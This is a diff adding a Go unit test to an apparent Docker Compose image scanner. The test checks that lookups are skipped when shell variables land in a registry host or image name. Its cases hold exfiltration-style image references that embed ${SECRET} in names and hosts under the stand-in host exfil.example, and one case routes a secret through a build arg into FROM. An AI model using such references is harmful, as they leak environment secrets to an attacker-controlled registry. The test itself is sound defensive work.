@@ -144,6 +144,54 @@ func TestParse_ExpandsVariables(t *testing.T) {
 	}
 }
 
+// TestParse_ShellValueInHostOrNameSkipsLookup keeps a scanned project from
+// sending the scanner's own environment to a registry the project names.
+func TestParse_ShellValueInHostOrNameSkipsLookup(t *testing.T) {
+	shell := lookupFrom(map[string]string{
+		"SECRET": "s3cr3t",
+		"SLASHY": "a/b",
+		"TAG":    "1.2.3",
+		"OWNER":  "me",
+	})
+	tests := []struct {
+		name     string
+		service  string
+		dotEnv   string
+		wantSkip bool
+	}{
+		{"shell value in the name of an unknown registry", "    image: exfil.example/${SECRET}:1.0\n", "", true},
+		{"shell value in the host", "    image: ${SECRET}.exfil.example/x:1.0\n", "", true},
+		{"shell value that moves from the tag into the name", "    image: exfil.example/x:${SLASHY}\n", "", true},
+		{"shell build arg that reaches FROM", "    build:\n      context: .\n      dockerfile_inline: \"ARG T\\nFROM exfil.example/${T}:1.0\\n\"\n      args:\n        T: ${SECRET}\n", "", true},
+		{"shell value only in the tag", "    image: registry.example.com/app:${TAG}\n", "", false},
+		{"shell value in a Docker Hub name", "    image: ${OWNER}/app:1.0\n", "", false},
+		{"shell value in a GHCR name", "    image: ghcr.io/${OWNER}/app:1.0\n", "", false},
+		{".env value in the name", "    image: exfil.example/${FROM_DOTENV}:1.0\n", "FROM_DOTENV=x\n", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dir := t.TempDir()
+			composePath := writeCompose(t, dir, "services:\n  app:\n"+tt.service)
+			if tt.dotEnv != "" {
+				if err := os.WriteFile(filepath.Join(dir, ".env"), []byte(tt.dotEnv), 0644); err != nil {
+					t.Fatal(err)
+				}
+			}
+			images, err := Parse(models.Project{Name: "test", Path: dir, ComposeFiles: []string{composePath}}, shell)
+			if err != nil {
+				t.Fatal(err)
+			}
+			got := images[0]
+			if got.SkipLookup != tt.wantSkip || got.Unverified != tt.wantSkip {
+				t.Errorf("SkipLookup = %v, Unverified = %v, want %v (image %+v, note %q)", got.SkipLookup, got.Unverified, tt.wantSkip, got.Image, got.RecommendationNote)
+			}
+			if tt.wantSkip && got.RecommendationNote == "" {
+				t.Error("skipped with no note")
+			}
+		})
+	}
+}
+
 func TestParse_NilLookupStillReadsDotEnv(t *testing.T) {
 	dir := t.TempDir()
 	composePath := writeCompose(t, dir, "services:\n  app:\n    image: app:${TAG}\n")
